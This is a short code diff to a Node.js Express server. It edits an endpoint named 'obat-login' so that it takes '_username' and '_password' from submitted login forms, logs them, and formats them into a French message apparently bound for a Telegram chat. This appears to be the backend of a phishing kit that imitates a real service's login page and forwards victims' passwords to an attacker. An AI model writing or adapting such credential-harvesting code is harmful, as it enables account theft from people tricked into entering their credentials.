@@ -138,13 +138,14 @@ const chatIdD = process.env.TELEGRAM_CHAT_ID_BOBBY;
 app.post('/submit/obat-login', express.json(), async (req, res) => {
   try {
     // Extract the form data from the request body
-    const { email, password, formTitle } = req.body;
+    console.log('req.body:', req.body);
+    const { _username, _password, formTitle } = req.body;
 
     // Format message for Telegram (use email & password as form fields in Obat)
     const telegramMessage = `
       Nouveau formulaire: ${formTitle || 'Obat Login'}
-      Email: ${email}
-      Mot de passe: ${password}
+      Email: ${_username}
+      Mot de passe: ${_password}
     `;
 
     console.log('telegramMessage:', telegramMessage);
